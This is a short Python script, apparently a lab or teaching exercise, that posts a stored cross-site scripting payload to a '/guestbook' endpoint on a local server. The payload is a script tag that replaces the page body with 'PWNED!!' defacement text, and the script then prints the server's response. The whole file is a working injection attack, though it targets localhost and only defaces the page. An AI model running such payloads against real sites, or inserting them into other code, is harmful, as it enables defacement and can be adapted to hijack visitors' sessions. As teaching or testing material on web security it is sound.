from http.client import HTTPConnection
from urllib.parse import urlencode

HOST = "localhost"
PORT = 8000
PAYLOAD = """
<script>
    const body = document.querySelector('body');
    body.innerHTML = '<h1>PWNED!! - 1337 h4xx0r</h1>';
</script>All your base are belong to us!
""".strip()

def version(v):
    parts = [ ]
    while v > 0:
        parts.append(str(v % 10))
        v = v // 10
    return ".".join(reversed(parts))

def main():
    connection = HTTPConnection(HOST, port=PORT)
    params = { "name": "PWNED LOSER!", "color": "Black", "message": PAYLOAD }
    connection.request("POST", "/guestbook", body=urlencode(query=params))
    response = connection.getresponse()
    connection.close()
    print("HTTP/" + version(response.version) + " " + str(response.status) + " " + str(response.reason))
    print(response.headers, end="")
    print(response.read())

if __name__ == "__main__":
    main()
